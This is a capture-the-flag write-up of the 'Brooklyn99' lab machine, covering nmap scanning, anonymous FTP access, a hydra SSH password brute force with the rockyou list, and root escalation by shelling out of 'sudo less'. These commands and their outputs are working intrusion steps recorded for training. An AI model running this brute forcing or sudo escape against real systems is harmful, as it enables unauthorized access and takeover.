
# CTF Writeup: Brooklyn99

---
## Reconaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sS -p- 10.112.148.85        
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-06 14:14 CDT
Nmap scan report for 10.112.148.85
Host is up (0.012s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.15 seconds
```

An more detailled scan revealed further information about the services.

```
nmap -n -Pn -sSCV -p 21,22,80 10.112.148.85
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-06 14:14 CDT
Nmap scan report for 10.112.148.85
Host is up (0.0094s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.227.246
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.81 seconds
```

I started off by checking out the ftp server, I was able to login anonymously.

```
ftp 10.112.148.85    
Connected to 10.112.148.85.
220 (vsFTPd 3.0.3)
Name (10.112.148.85:saitama): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

There seems to be an .txt file stored inside the ftp share, downloaded it onto my local machine. The note also hinted to an user called "jack".

```
get note_to_jake.txt
```

The payload itself hints to an weak password, could be bruteforce it?

```
cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

Utilized tool "hydra" in order to bruteforce user jake's password.

```
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.112.148.85
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-06 14:20:09
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.112.148.85:22/
[22][ssh] host: 10.112.148.85   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-06 14:20:11
```

Successfully connected to the server via SSH.

```
ssh jake@10.112.148.85      
The authenticity of host '10.112.148.85 (10.112.148.85)' can't be established.
ED25519 key fingerprint is: SHA256:ceqkN71gGrXeq+J5/dquPWgcPWwTmP2mBdFS2ODPZZU
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.112.148.85' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
jake@10.112.148.85's password: 
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$
```

Retrieved user.txt in /home/holt directory.

```
ee11cbb19052e40b07aac0ca060c23ee
```

Checked out sudo permissions for user "jake".

```
jake@brookly_nine_nine:/$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

Since he is able to run the "less" binary with root permissions and no authentication required, I'll 

```
sudo less /etc/hosts
!/bin/bash
```

Gained RCE as user "root".

Retrieved root.txt in /root directory.

```
63a9f0ea7bb98050796b649e85481845
```